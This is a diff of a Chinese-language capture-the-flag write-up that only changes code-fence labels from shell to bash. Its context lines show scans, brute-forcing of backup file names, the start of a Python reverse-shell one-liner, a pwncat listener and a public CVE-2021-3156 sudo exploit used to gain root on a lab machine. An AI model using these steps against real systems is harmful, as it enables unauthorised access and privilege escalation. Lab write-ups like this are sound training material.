@@ -54,7 +54,7 @@ Open 10.13.37.11:80
 Open 10.13.37.11:5000
 ```
 
-```shell title="sudo nmap -A --min-rate=5000 -T4 -sU --top-ports 20 10.13.37.11"
+```bash title="sudo nmap -A --min-rate=5000 -T4 -sU --top-ports 20 10.13.37.11"
 PORT      STATE         SERVICE      VERSION
 161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)
 | snmp-win32-software:
@@ -233,7 +233,7 @@ the credentials required.</p>
 
 尝试更换其他协议进行请求，比如 `POST`
 
-```shell title="http post http://10.13.37.11/scripts/backup_every_17minutes.sh"
+```bash title="http post http://10.13.37.11/scripts/backup_every_17minutes.sh"
 #!/bin/bash
 #
 # This script performs backups of production and development websites.
@@ -278,14 +278,14 @@ Date: Wed, 06 Mar 2024 16:07:01 GMT
 
 然后开始爆破
 
-```shell title="ffuf -c -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u http://10.13.37.11/backups/backup_2024030615FUZZ.zip"
+```bash title="ffuf -c -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u http://10.13.37.11/backups/backup_2024030615FUZZ.zip"
 [Status: 200, Size: 22071775, Words: 0, Lines: 0, Duration: 0ms]
     * FUZZ: 5716
 ```
 
 将文件下载下来
 
-```shell
+```bash
 wget http://10.13.37.11/backups/backup_20240306155716.zip
 ```
 
@@ -497,7 +497,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 成功收到回连的 shell
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $ pwncat-cs -lp 9999
 [00:24:58] Welcome to pwncat 🐈!
@@ -510,7 +510,7 @@ aas
 
 列出目录下的所有文件
 
-```shell
+```bash
 (remote) aas@Leakage:/home/aas$ ls -lah
 total 28K
 drwxr-xr-x 3 aas  aas  4.0K Feb  9  2020 .
@@ -533,7 +533,7 @@ AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}
 
 探测环境中，注意到 `sudo` 的版本信息
 
-```shell
+```bash
 (remote) aas@Leakage:/home/aas$ sudo --version
 Sudo version 1.8.21p2
 Sudoers policy plugin version 1.8.21p2
@@ -545,7 +545,7 @@ Sudoers I/O plugin version 1.8.21p2
 
 使用 [CVE-2021-3156/exploit_nss.py at main · worawit/CVE-2021-3156](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py) 进行攻击
 
-```shell
+```bash
 (remote) aas@Leakage:/tmp$ ./exploit
 [sudo] password for aas:
 There's a lot of it about, you know.
@@ -555,7 +555,7 @@ root
 
 在 `/root` 目录中，列出文件夹信息
 
-```shell
+```bash
 (remote) root@Leakage:/root# ls -lh
 total 8.0K
 -rw-r--r-- 1 root root  26 Feb  9  2020 flag.txt
